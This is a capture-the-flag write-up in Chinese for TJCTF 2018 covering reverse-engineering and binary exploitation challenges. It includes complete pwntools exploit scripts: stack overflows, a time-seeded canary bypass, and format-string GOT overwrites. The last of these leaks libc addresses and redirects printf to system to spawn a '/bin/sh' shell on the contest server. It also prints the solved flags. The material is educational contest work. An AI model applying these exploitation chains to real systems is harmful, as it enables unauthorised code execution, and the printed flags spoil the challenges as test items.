# 2018-TJCTF-Bin-Writeup

> Unsolved: pwn-Online-Banking

## Reverse

### Validator(points: 30)

首先file看一下

```shell
▶ file flagcheck 
flagcheck: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=89bdc886ab26b531450aa6ecb741b66a060b7605, not stripped
```

用ida看伪代码会发现是明文比较，如下图。

![](http://wx1.sinaimg.cn/mw690/0060lm7Tly1fu5hhjumbhj30eb0eygml.jpg)

但是把其中的一些字符给赋了其他的值，直接看看不出什么(其实也可以直接手动替换2333，根据s1,v5,v6,v7的相对偏移就可以进行替换)，于是尝试ida调试&gdb调试。

#### The fisrt way: IDA调试

> 关于如何在IDA中调试elf详见：https://blog.csdn.net/abc_670/article/details/80066817

首先在Debugger->Process options里设置argv参数，长度为43

![](http://wx1.sinaimg.cn/mw690/0060lm7Tly1fu5jtfbvlyj30gj094dg6.jpg)

在`if ( strlen(argv[1]) == 43 )`处下断点，开始调试 

当替换完成后，由于s1处于ebp-0x38的位置，于是在ebp-0x38处`add watch`，其实下断点也不是最直接的方式，这里就提一下。

> 下断点: Debugger->Watchs->add watch

可以看到`ebp = 0xffb1c158`，那么s1在栈上地址为`ebp-0x38 = 0xffb1c120`

![](http://wx2.sinaimg.cn/mw690/0060lm7Tly1fu5k4xe3xxj30cd07w74i.jpg)

在`stack view`的表里我们可以直接的看到ebp-0x38处的值，如下图

![](http://wx3.sinaimg.cn/mw690/0060lm7Tly1fu5k6cb7fwj30cg07djrs.jpg)

但是这样还不够直观，我们可以在`FFB1C120`处右键->Follow in hex dump

然后点View->Open subviews->Hex dump，即可看到`FFB1C120`对应的值的字符形式

![](http://wx2.sinaimg.cn/mw690/0060lm7Tly1fu5k9ybi23j30f7077t9b.jpg)

至此，flag到手:-)

#### The second way: GDB调试

关键命令如下

```shell
gdb flagcheck
start aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
b *0x080485AB
c

pwndbg> x/10 $ebp-0x38
0xffffd3f0:	"tjctf{ju57_c4ll"...
0xffffd3ff:	"_m3_35r3v3r_60d"...
0xffffd40e:	"_fr0m_n0w_0n}"
0xffffd41c:	""
0xffffd41d:	"\256\300\217\334\323\372\367@\324\377\377"
0xffffd429:	""
0xffffd42a:	""
0xffffd42b:	""
0xffffd42c:	"v\"\341\367\002"
0xffffd432:	""
```

即可拿到flag:-)

> 相对IDA的dynamic debugging，我用gdb更为顺手:-(
>
> 但ida的可视化确实很方便，并且还有很多功能待学习

<br>

### Python-Reversing(points: 40)

先放源码

```python
import numpy as np

flag = 'redacted'

np.random.seed(12345)
arr = np.array([ord(c) for c in flag])
other = np.random.randint(1,5,(len(flag)))
arr = np.multiply(arr,other)

b = [x for x in arr]
lmao = [ord(x) for x in ''.join(['ligma_sugma_sugondese_'*5])]
c = [b[i]^lmao[i] for i,j in enumerate(b)]
print(''.join(bin(x)[2:].zfill(8) for x in c))

# original_output was 1001100001011110110100001100001010000011110101001100100011101111110100011111010101010000000110000011101101110000101111101010111011100101000011011010110010100001100010001010101001100001110110100110011101
```

大致的加密过程如下

>b = flag * other
>
>c = b ^ lmao

这里的other是一个由不大于4的数组成的随机数组，但随机数的种子给了，相当于other已知，而lmao也是已知的，直接逆就可以。

但是有一个问题，original_output这串二进制串长度为202，并不能被8整除，我当时就很疑惑，以为我下载的文件是错的。。。

后来想明白了，由于第一步加密中flag直接与other相乘，导致b数组的值可能大于255，超出8位二进制串能表示的最大值，于是在zfill的时候长度大于8，就像下面这样。

>\>\>\>a = 0b100000000
>\>\>\>bin(a)[2:].zfill(8)
>\>\>\>'100000000'
>\>\>\>len(bin(a)[2:].zfill(8))
>\>\>\>9
>

那么我们怎么判断是哪个位置的值大于255呢，这里可以通过当为8位二进制串时，和lmao异或之后模other是否为0，如果不为0，就再添加一位二进制数。

exp如下

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

import numpy as np

flag = 'abcdefghijklmnopqrstuvwxy'

np.random.seed(12345)
#arr = np.array([ord(c) for c in flag])
#print arr 
other = np.random.randint(1,5,25)
print "[+]other: {}".format(other)
#arr = np.multiply(arr,other)
#print arr
#b = [x for x in arr]

lmao = [ord(x) for x in ''.join(['ligma_sugma_sugondese_'*5])]

#c = [b[i]^lmao[i] for i,j in enumerate(b)]

#print(''.join(bin(x)[2:].zfill(8) for x in c))

output = '1001100001011110110100001100001010000011110101001100100011101111110100011111010101010000000110000011101101110000101111101010111011100101000011011010110010100001100010001010101001100001110110100110011101'
#output1 = [304, 189, 161, 133, 7, 169,291]

s = ''
output1 = []
sum,num = 0,0
v = 0
flag = 0

for i,j in enumerate(output):

	if sum%8 == 0 and flag == 1:
		
		v  = eval('0b'+s)
		if (v^lmao[num])%other[num] != 0:
			output1.append( eval('0b'+s+j) )
			s = ''
			
		else:
			output1.append( v )
			sum += 1
			s = j
		num += 1
		flag = 0
		
	else:
		s+= j
		sum += 1
		flag = 1

#print output1

print "[+]lmao: {}".format(lmao)
#context.log_level = 'debug'

mod = [(lmao[i]^output1[i])%other[i] for i in range(len(output1))]
print "[+]mod==0? {}".format(mod)
output2 = [ chr((lmao[i]^output1[i])/other[i]) for i in range(len(output1)) ]
 
print "[+]flag: {}".format(''.join(output2))
#output3 = [ ofor i in range(25) ]
```

<br>

### Bad-Cipher(points: 50)

源码如下

```python
message = "[REDACTED]"
key = ""

r,o,u,x,h=range,ord,chr,"".join,hex
def e(m,k):
 l=len(k);s=[m[i::l]for i in r(l)]
 for i in r(l):
  a,e=0,""
  for c in s[i]:
   a=o(c)^o(k[i])^(a>>2)
   e+=u(a)
  s[i]=e
 return x(h((1<<8)+o(f))[3:]for f in x(x(y)for y in zip(*s)))

print(e(message,key))
```

这道题其实就是个分组加密，下面通过一个例子解释一下

>message = '123456789'
>
>key = 'abc'
>
>s = [ '147','258','369' ]
>
>对于s[0]的第一个字符‘1’，a = o('1')^o('a')^(a>>2)，此时a的初始值为0，相当于s[0]的第一个加密结果== o('1')^o('a')，这很重要
>
>之后进行相同操作
>
>s_encode = ['PAF', 'PCJ', 'PAJ']
>
>注意：返回的结果相当于'PPPACAFJJ'.encode('hex')

#### Step1: 爆破key的长度

首先我们确定len(message)应该要整除len(key)，那么key可能是`2 4 7 8 14 28 ` 

解题的关键在于flag格式为`tjctf{}`，相当于我们知道message的前6个字符，而分组加密中每组的第一个字符就是message的前几位，如果分组的长度正确，那么message[i]^cipher[i]的结果，即key，应该是可见字符，以此为标准爆破。

#### Step2: 爆破key的后两位

这里假设已经知道了key的长度为8，而我们可以通过message的固定格式知道key的前6位，那么最后两位直接爆破即可。

#### Exp如下

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

message = "[REDACTED]"
key = "123456"
c = '473c23192d4737025b3b2d34175f66421631250711461a7905342a3e365d08190215152f1f1e3d5c550c12521f55217e500a3714787b6554'.decode('hex')

key_len = [2,4,7,8]#14,28

r,o,u,x,h=range,ord,chr,"".join,hex

def e(m,k):
 l=len(k);s=[m[i::l]for i in r(l)]
#print s
 for i in r(l):
  a,e=0,""
  for c in s[i]:
   a=o(c)^o(k[i])^(a>>2)
   e+=u(a)
  s[i]=e
#print s
 return x(h((1<<8)+o(f))[3:]for f in x(x(y)for y in zip(*s)))

def d(c,key1,offset):

	flag = ''
				
	a = [ 0 for l in range(len(key1)) ]
	lenk = len(key1)
					
	for k in range(len(c)):
						
		if k%offset < lenk:
			flag += chr( key1[k%offset]^ord(c[k])^(a[k%offset]>>2) )
			a[k%offset] = ord(flag[k])^key1[k%offset]^(a[k%offset]>>2)
		else:
			flag += ' '
	#burp_len
	if len(key1) == 1 and flag.replace(' ','').isalnum():
		print "[*]You got the length. FLAG: {}".format(flag.replace(' ',''))
	#burp_flag
	if flag.replace('_','').replace('{','').replace('}','').isalnum():
		print "key1 = {} key2 = {} flag = {}".format(key1[6],key1[7],flag)	
def burp_len():
	
	for i in [2,4,7,8,14,28]:
		
		#key[0] == ord('t')^0x47
		key = [ord('t')^0x47]
		print "[+]The key length is {} QAQ".format(i)
		d(c,key,i)

if __name__ == '__main__':

	burp_len()
	key_len = 8
	flag = 'tjctf{'
	for i in range(32,127):
		for j in range(32,127):
			
			key = [ ord(flag[k])^ord(c[k]) for k in r(len(flag)) ]
			key.append(i)
			key.append(j)
#print key
			assert len(key) == key_len	
			d( c, key, key_len )
	
	key = [ chr(ord(flag[k])^ord(c[k])) for k in r(len(flag)) ]
	flag = 'tjctf{m4ybe_Wr1t3ing_mY_3ncRypT10N_MY5elf_W4Snt_v_sm4R7}'
	key.append(chr(90))
	key.append(chr(54))
	
	if e(flag,x(key)) == c.encode('hex'):
		print "Right!!!"

#print(e(message,key))
```

<br>

### Bricked-Binary(points: 80)

> 这题算是经典的elf逆向，难度不大，直接放出脚本，idc脚本也在里面

#### Exp如下

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

u = [4,7,5,8,12,10,6,2,13,1,0,14,9,11,3,15]

v = [129,205,10,115,179,59,50,182,110,124,49,87,209,197,21,58,146,180,226,81,174,66,85,65,225,112,48,26,2,132,162,231,185,77,60,163,11,178,43,171,70,126,36,156,133,111,228,196,95,206,79,1,130,253,108,172,223,100,12,161,227,158,93,187,254,211,41,150,199,243,252,101,170,138,90,245,183,56,165,141,216,142,57,7,222,213,17,128,229,137,53,255,221,166,31,35,13,192,147,200,103,23,104,24,139,98,204,157,218,86,102,198,127,230,134,224,34,194,15,27,246,45,99,51,145,113,89,235,169,210,131,191,61,106,8,249,167,64,0,232,82,190,250,78,38,118,207,84,125,25,6,248,208,116,40,5,63,160,30,193,69,73,212,175,3,155,47,238,39,154,164,151,72,74,217,55,71,173,68,202,239,215,184,219,240,159,88,83,234,42,122,54,135,140,181,114,136,177,9,241,22,62,105,20,236,37,188,237,186,189,44,201,220,19,244,117,29,75,195,52,16,107,119,152,94,92,153,143,18,148,203,46,76,233,32,247,67,96,251,109,28,120,14,176,214,80,121,123,97,149,168,4,91,242,144,33]
#print len(u),len(v)
'''
idc_export_v
auto addr = 0x0804A040;
auto addr1 = 0x0804A43C;
auto i,x;
Message("\n");
for(i=0;addr<=addr1;i++)
{
    x = Byte(addr);
    addr =addr + 4;
    Message("%d,",x);
}
'''
output = '22c15d5f23238a8fff8d299f8e5a1c62'
out_flag = map(ord,output.decode('hex'))
print out_flag

flag = ''
for i in range(len(out_flag)):
	for j in range(256):
		if v[j]^u[len(out_flag)-i-1] == out_flag[i]:
			flag += chr(j)
			break
print flag,len(flag)
```

<br>

## Pwn

### Math-Whiz(points: 20)

先看看开了什么保护，发现只有栈溢出可以利用:-)

```shell
▶ checksec register
[*] '/2018TJCTF/pwn-Math-Whiz20/register'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

用ida看下伪代码，关键在于v43是否为0

![](http://wx4.sinaimg.cn/mw690/0060lm7Tly1fu5qxtbuwdj30eo0373yo.jpg)

那么通过栈溢出覆盖v43即可

最初脚本如下，暴力的一批

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
io = remote('problem1.tjctf.org', 8001)

for i in range(7):
	io.sendlineafter(': ','a'*100)
io.interactive()
```

事实上看ida可以知道v43处于ebp-0xc的位置，只有在输入v30的时候允许最长长度为64的字符串，而v30处于ebp-0x44，v30和v43相距56，所以覆盖点在v30。

精致的输入如下

![](http://wx3.sinaimg.cn/mw690/0060lm7Tly1fu5r6kglynj30so08ejtc.jpg)

<br>

### Tilted-Troop(points: 40)

首先看下开了什么保护，发现全开了:-(

```shell
▶ checksec strover 
[*] '/2018TJCTF/pwn-Tilted-Troop40/strover'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

给了源码，那就不费那劲看伪代码了，程序流程就是组个队打怪，如果最后队伍的队员力量值和等于400，拿到flag。

这里有个bug就是一个队伍里最大队员数只有8个，但是由于逻辑有bug导致我们能输入9个队员的信息。因为队员的名字和力量的地址是在内存中是连续的，如下图。所以第九个队员的name会把strength数组覆盖，那么我们就可以精确控制第九个队员的name覆盖strength数组使得队员的力量值和为400。

```c
#define MAX_TEAM_SIZE 8

const int goal = 400;

struct team {
    char* names[MAX_TEAM_SIZE];
    char* strength;
    int teamSize;
} typedef team;

```

exp如下

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
from sys import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c' ]

if argv[1] == 'l':
	io = process('./strover')
else:
	io = remote('problem1.tjctf.org', 8002)

for i in range(8):
	io.sendline("A "+str(i)*4)

io.sendline( "A " + chr(400/4)*4 )
io.sendline("F")

io.interactive()
```

<br>

### Future-Canary-Lab(points: 80)

首先看下开了哪些保护，发现又是个栈溢出的题目

```shell
▶ checksec interview 
[*] '/2018TJCTF/pwn-Future-Canary-Lab80/interview'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

首先main函数中`time(0)`获取当时系统时间，然后以此为随机数种子

![](http://wx2.sinaimg.cn/mw690/0060lm7Tly1fu5rfpfhv0j30ge05g0sx.jpg)

然后在interview函数中生成10个随机数，存在v1里，并copy一份给v3。

![](http://wx4.sinaimg.cn/mw690/0060lm7Tly1fu5rrqferrj30g30ev75e.jpg)

看下栈的情况会发现，v1处于ebp-0x10，s处于ebp-0x78，v3处于ebp-x038。

如果我们直接将s赋值一个很长的字符串+0xdeadbeef，那么原本和v1相等的v3则会被覆盖为我们的输入，造成check失败。所以我们应该构造一个包含这10个随机数的payload，再发过去就稳了。

> 这里还有一个坑点是在`a1-i+j`这里，我们在输入s之后会把`i`和`j`的值也覆盖掉，由于之后`j`还会被赋值为10，所以`i`还是我们输入的值，那么`a1`我们就不能传`0xdeadbeef`。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
import ctypes
import sys
context.log_level = 'debug'

if sys.argv[1] == 'l':
	io = process('./test')
else:
	io = remote('problem1.tjctf.org', 8000)

dll = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6') 

v4 = dll.time(0)
#print v4
dll.srand(v4)
v3 = [ dll.rand()  for i in range(10) ]
payload = '\x11'*(0x40)
for i in v3:
	payload += p32(i)
payload += '\x11'*(0x18)	
payload += p32(0xdeadbeef+0x11111111-10)
#info(payload)

io.sendlineafter("?\n",payload)

io.interactive()
```

<br>

### Online-Banking(points: 100)



<br>

### Secure-Secrets(points: 110)

先看看开了哪些保护，发现除了地址随机化都有:-(

```shell
▶ checksec secure 
[*] '/2018TJCTF/pwn-Secure-Secrets110/secure'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用ida看伪代码会发现`get_message`函数存在明显的格式化字符串漏洞

![](http://wx4.sinaimg.cn/mw690/0060lm7Tly1fu5s3ylrt9j30fm08p0tb.jpg)

并且`get_secret`函数可以直接拿到flag

![](http://wx2.sinaimg.cn/mw690/0060lm7Tly1fu5s4ijdwej309m08gq3c.jpg)

那么目的就很明确了，通过fsb的任意地址写将`exit`函数覆盖为`get_secret`的地址即可拿到flag:-)

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
from sys import *
context.log_level = 'debug'

if argv[1] == 'l':
	io = process('./secure')
else:
	io = remote('problem1.tjctf.org', 8008)

elf = ELF('./secure')

def send_message(payload):
	
	io.sendlineafter('> ','666')
	
	io.sendlineafter('> ',payload)
	
	io.sendlineafter('> ','666')
	

def loop_it():
	
	main_addr = elf.symbols['main']
	exit_got = elf.got['exit']
#print "[+]exit_got = {}".format(hex(exit_got))
	payload = p32(elf.got['printf']) + '%' + str((main_addr&0xffff)-4) + 'c%35$hn'
	
	info(payload)
	send_message(payload)

def get_flag():

	flag_addr = elf.sym['get_secret']
	
	payload = p32(elf.got['exit']) + '%' + str((flag_addr&0xffff)-4) + 'c%35$hn'
#	payload = fmtstr_payload( 35, {printf_got:flag_addr} )
	send_message(payload)
	io.recv()
	
if __name__ == '__main__':

	#loop_it()
	get_flag()
	io.interactive()
```

<br>

### Super-Secure-Secrets(points: 140)

64位格式化字符串的题目，第一次做64位的，给坑了很久。。

简单分析一下程序，`set_message`用来存payload

![](http://wx3.sinaimg.cn/mw690/0060lm7Tly1fu84kl3dppj30h40bxdh0.jpg)

`get_message`中有fsb，可以用它来达到任意地址读和任意地址写，并且由于程序只能执行一次get_message操作，我们可以通过将`memset`的got表的真实地址覆盖成`_start`的地址达到循环的目的。

![](http://wx3.sinaimg.cn/mw690/0060lm7Tly1fu84l4py20j30w10l977v.jpg)

当我们能够无限次利用fsb的时候，常规操作一通上基本就稳了。

> 常规操作：
>
> 1. 泄露两个函数的真实地址从而确定libc版本
> 2. 通过libc得到system函数的真实地址
> 3. 将printf的真实地址覆盖为system的真实地址
> 4. 传""/bin/sh\0"从而getshell

**一些64位程序的坑**：

- 这里由于程序是64位，传参顺序为rdi, rsi, rdx, rcx, r8, r9，接下来才是栈，所以在计算偏移时应在栈的基础上加6。
- 由于64位程序的地址的高字节都是`\x00`，如果放在payload前面会把后面的截断，所以传地址时应放在payload的最后面。

**一个关于优先级的坑(之前给坑过，写着这题又忘了...)**

```
>>> a = 0x1234
>>> ((a>>8)&0xff)-4 // 预期结果
14
>>> (a>>8)&(0xff-4) // 非预期结果
18
>>> (a>>8)&0xff-4 // 非预期结果
18
```

那么开始解题拿flag:-)

首先泄露libc，这个可以在没loop之前得到，跑两次就行了。

![](http://wx2.sinaimg.cn/mw690/0060lm7Tly1fu859upxflj30op09d74j.jpg)

然后就让程序循环，利用got表可写的特性将memset的真实地址覆盖为_start，这里\_start其实就是程序的入口点，它负责调用main函数。接着泄露一次printf的真实地址，计算得到system的真实地址，再构造payload将printf覆盖为system。最后传`"/bin/sh\0"`，`get_message`的`printf(a)`实际上就是`system("/bin/sh")`。

exp如下

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
from sys import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c' ]
context.binary = './super_secure'

elf = context.binary
if argv[1] == 'l':
	io = process('./super_secure')
	libc = elf.libc
else:
	io = remote('problem1.tjctf.org', 8009)
	libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')

def DEBUG():
	gdb.attach(io,'b *0x400c60\nb *0x400CD5\nc\n')

def mysend(payload,flag=False):

	io.sendlineafter("> ","s")
	io.sendlineafter(":\n","111111")
	io.sendlineafter(":\n",payload)
	
	io.sendlineafter("> ","v")
	io.sendlineafter(":\n","111111")
	if not flag:
		io.sendline("f**kyo")

def set_to_memset():
	
	payload = ("%{}c%{}$hn".format(elf.sym["_start"]&0xffff,28)).ljust(16,'+') + p64(elf.got['memset'])
	mysend(payload)

def leak(addr):

	payload = "++%27$s+" + p64(addr)
	mysend(payload)

	io.recvuntil("++")
	real_addr = io.recvuntil("+")[:-1]
	real_addr = u64( real_addr + "\x00"*(8-len(real_addr)) )

	print hex(real_addr)
	return real_addr 

def printf_to_system(printf_addr):

	system_addr = libc.sym['system'] + printf_addr - libc.sym['printf']
	print hex(system_addr),hex(printf_addr)

	payload = ("%{}c%30$hhn".format(system_addr&0xff)).ljust(16,'+')
	payload += ("%{}c%31$hn".format( ((system_addr>>8)&0xffff) - (system_addr&0xff) - 5 )).ljust(16,'+')
	payload += p64( elf.got['printf'] ) + p64( elf.got['printf']+1 )
	info(payload)
#DEBUG()
	mysend(payload)
	
	io.sendline("s")
	io.sendline("111111")
	io.sendline("/bin/sh\0")

	io.sendline("v")
	io.sendline("111111")

if __name__ == "__main__":
	
	set_to_memset()
	printf_addr = leak(elf.got['printf'])
	printf_to_system(printf_addr)

	io.interactive()
```

<br>

## Reference

- 在线libc-database：https://libc.blukat.me/
- _start的作用：https://stackoverflow.com/questions/29694564/what-is-the-use-of-start-in-c

